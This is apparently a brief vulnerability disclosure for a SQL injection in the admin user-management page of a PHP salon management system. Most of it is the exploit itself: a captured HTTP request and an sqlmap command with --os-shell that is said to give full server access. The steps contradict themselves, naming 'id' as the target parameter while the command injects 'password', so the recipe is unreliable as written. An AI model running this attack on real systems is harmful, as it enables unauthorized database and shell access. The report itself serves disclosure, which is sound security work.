Description:-A SQL Injection issue in Simple Online Men's Salon Management System allows to get an complete Remote Access into the website. Access such as database, files and everything.
`Payload used:-python sqlmap.py -r read.TXT -p password --risk 2 --level 3 --os-shell
`Parameter":- read.txt file is our payload file
```GET /msms/admin/?page=user/manage\_user&id=3 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=06rf7g4o1p13b8d4kpci1fobjbUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1```
`Steps to reproduce:-
1. Here we take the GET method of "http://localhost/msms/admin/?page=user/manage\_user&id=3" just this page only 2. In this we target our paramter as "id" and save it to a txt file.3. Now we are gonna use "SQLMap" tool and with this following command
\*\*python sqlmap.py -r read.TXT -p password --risk 2 --level 3 --os-shell\*\*
4. As we can see we got the complete access of the server
